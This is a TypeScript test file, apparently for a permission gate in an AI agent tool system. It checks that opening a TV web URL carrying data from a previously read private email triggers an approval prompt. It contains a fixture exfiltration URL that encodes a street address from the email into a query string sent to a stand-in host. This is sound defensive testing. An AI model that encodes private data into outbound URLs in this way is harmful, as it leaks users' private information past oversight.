import { describe, expect, it } from 'vitest';
import { egressUrlOf } from '../src/egress-taint.js';
import { Gate } from '../src/permissions.js';

function gate() {
  const asked: string[] = [];
  const g = new Gate({
    protectedPaths: [],
    allow: ['mail', 'tv'],
    egressTaint: true,
    approver: (_c, reason) => {
      asked.push(reason);
      return true;
    },
  });
  return { g, asked };
}

const MAIL = { tool: 'mail', args: { action: 'read', id: '1' }, actor: 'me' };
const BODY = 'Te espero en la Calle del Pez 14, portal 3B, a las 19:30.';
const DATA_URL = 'https://otro.example/x?d=Calle%20del%20Pez%2014%20portal%203B';
const tvUrl = (url: string) => ({ tool: 'tv', args: { action: 'url', url }, actor: 'me' });

describe('puerta de exfiltración: abrir una web en la tele', () => {
  it('tras leer el correo, abrir en la tele una URL con datos pregunta', async () => {
    const { g, asked } = gate();
    await g.check('s', MAIL);
    g.settle('s', MAIL, false, BODY);
    await g.check('s', tvUrl(DATA_URL));
    expect(asked).toHaveLength(1);
    expect(asked[0]).toMatch(/contenido privado/);
  });

  it('sin nada privado leído, o con una URL sin datos, no pregunta', async () => {
    const { g, asked } = gate();
    await g.check('s', tvUrl(DATA_URL));
    expect(asked).toHaveLength(0);
    await g.check('s', MAIL);
    g.settle('s', MAIL, false, BODY);
    await g.check('s', tvUrl('https://www.rtve.es/'));
    expect(asked).toHaveLength(0);
  });

  it('solo action=url de la tele cuenta como salida', () => {
    expect(egressUrlOf('tv', { action: 'url', url: DATA_URL })).toBe(DATA_URL);
    expect(egressUrlOf('tv', { action: 'power', on: true, url: DATA_URL })).toBeNull();
    expect(egressUrlOf('tv', { action: 'url' })).toBeNull();
  });
});
